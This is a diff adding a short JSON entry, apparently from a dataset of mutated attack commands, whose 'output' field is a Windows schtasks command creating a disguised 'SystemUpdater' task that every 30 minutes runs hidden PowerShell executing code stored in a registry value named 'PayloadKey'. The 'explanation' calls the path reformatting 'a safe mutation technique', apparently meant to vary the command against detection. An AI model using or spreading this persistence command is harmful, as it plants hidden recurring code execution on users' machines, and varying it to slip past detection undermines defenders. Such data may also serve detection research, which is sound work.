@@ -1,0 +1,6 @@
+[
+  {
+    "output": "schtasks.exe /Create /F /TN \"SystemUpdater\" /TR \"powershell.exe -WindowStyle Hidden -Command IEX((Get-ItemProperty -Path HKCU:\\SOFTWARE\\PayloadKey).PayloadValue)\" /SC MINUTE /MO 30",
+    "explanation": "Reformatted the registry path using double backslashes for clarity and consistency, which is still parsed correctly by Windows. This is a safe mutation technique."
+  }
+]
